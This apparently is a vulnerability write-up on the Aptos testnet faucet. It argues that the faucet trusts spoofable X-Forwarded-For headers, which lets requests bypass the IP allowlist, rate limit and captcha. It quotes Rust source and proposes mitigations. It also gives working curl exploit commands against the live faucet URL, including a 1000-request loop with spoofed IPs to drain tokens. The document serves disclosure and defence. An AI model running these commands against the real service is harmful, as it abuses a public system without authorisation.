# Aptos Core Faucet — IP Spoofing & Bypass Analysis
# 2026-08-14

---

## Summary

Aptos Faucet (testnet token distribution) has **IP-based trust weaknesses** that allow bypass of:
- Rate limiting
- Captcha verification
- IP allowlist bypass

**Not RCE. Not admin takeover.** Just faucet drain via header spoofing.

---

## Architecture

```
User Request
    ↓
poem::web::RealIp (parses X-Forwarded-For, X-Real-IP, CF-Connecting-IP)
    ↓
┌─────────────────────────────────────────────────────────────┐
│  Bypassers (skip all checkers if match)                     │
│  ├─ IpAllowlistBypasser → contains_ip(source_ip)           │
│  └─ AuthTokenBypasser → contains(auth_token)               │
└─────────────────────────────────────────────────────────────┘
    ↓ (if no bypass)
┌─────────────────────────────────────────────────────────────┐
│  Checkers (reject if any says no)                           │
│  ├─ MemoryRatelimitChecker → IP-based daily limit          │
│  ├─ GoogleCaptchaChecker → verify token + remoteip         │
│  └─ IpBlocklistChecker → reject if IP blocked              │
└─────────────────────────────────────────────────────────────┘
    ↓
Funder (mint/transfer tokens)
```

---

## Vulnerability 1: IP Allowlist Bypass

**File:** `crates/aptos-faucet/core/src/bypasser/ip_allowlist.rs:26-28`

```rust
async fn request_can_bypass(&self, data: CheckerData) -> Result<bool> {
    Ok(self.manager.contains_ip(&data.source_ip))
}
```

**Issue:** `source_ip` comes from `poem::web::RealIp` which trusts `X-Forwarded-For`.

**Exploit:**
```bash
curl -X POST https://faucet.testnet.aptoslabs.com/v1/fund \
  -H "X-Forwarded-For: <ALLOWED_IP>" \
  -H "Content-Type: application/json" \
  -d '{"address": "0xattacker"}'
```

**Impact:** Bypass captcha + rate limit if IP is in allowlist.

---

## Vulnerability 2: Rate Limit IP Spoofing

**File:** `crates/aptos-faucet/core/src/checkers/memory_ratelimit.rs:77-85`

```rust
let requests_today = ip_to_requests_today.get_or_insert_mut(data.source_ip, || 1);
if *requests_today >= self.max_requests_per_day {
    return Ok(vec![RejectionReason::new(
        format!("IP {} has exceeded the daily limit", data.source_ip),
        ...
    )]);
}
```

**Issue:** Rate limit keyed on `source_ip` which is spoofable.

**Exploit:**
```bash
for i in {1..1000}; do
  curl -X POST https://faucet.testnet.aptoslabs.com/v1/fund \
    -H "X-Forwarded-For: 192.168.$((RANDOM % 256)).$((RANDOM % 256))" \
    -d '{"address": "0xattacker"}'
done
```

**Impact:** Unlimited testnet token claims.

---

## Vulnerability 3: Captcha remoteip Spoofing

**File:** `crates/aptos-faucet/core/src/checkers/google_captcha.rs:80-84`

```rust
.form::<VerifyRequest>(&VerifyRequest {
    secret: self.config.google_captcha_api_key.0.clone(),
    response: captcha_token.to_string(),
    remoteip: data.source_ip.to_string(),  // ← Spoofed IP
})
```

**Issue:** Google receives spoofed IP for captcha verification.

**Impact:** Captcha verification uses wrong IP context.

---

## Vulnerability 4: Auth Token Bypass

**File:** `crates/aptos-faucet/core/src/bypasser/auth_token.rs:32-49`

```rust
async fn request_can_bypass(&self, data: CheckerData) -> Result<bool> {
    if data.headers.contains_key(X_IS_JWT_HEADER) {
        return Ok(false);  // Skip bypass
    }
    let auth_token = match data.headers.get(AUTHORIZATION)...
    Ok(self.manager.contains(auth_token))
}
```

**Issues:**
1. Plain string comparison (no timing-safe)
2. Token stored in config file (readable if permissions loose)
3. If token leaks → full bypass

---

## Mitigation

### Short-term
```rust
// Don't trust X-Forwarded-For for security decisions
// Use reverse proxy that strips untrusted headers
// Or require auth for bypass (not just IP match)
```

### Long-term
```rust
// Multi-factor identification: IP + fingerprint + JWT
// Don't rely solely on IP for rate limiting
// Use Redis with proper auth, not in-memory LRU
```

---

## Severity Assessment

| Network | Impact | Severity |
|---------|--------|----------|
| Mainnet | N/A (faucet is testnet-only) | — |
| Testnet | Drain testnet APT | **MEDIUM** |
| Devnet | Drain devnet APT | **LOW** |

**Not critical.** Testnet token has no real value. But demonstrates weak IP-based trust.

---

## Files Referenced

- `crates/aptos-faucet/core/src/bypasser/ip_allowlist.rs`
- `crates/aptos-faucet/core/src/bypasser/auth_token.rs`
- `crates/aptos-faucet/core/src/checkers/memory_ratelimit.rs`
- `crates/aptos-faucet/core/src/checkers/google_captcha.rs`
- `crates/aptos-faucet/core/src/endpoints/fund.rs`

---

*Analysis: IRONCLAW V8.2 methodology · 2026-08-14*
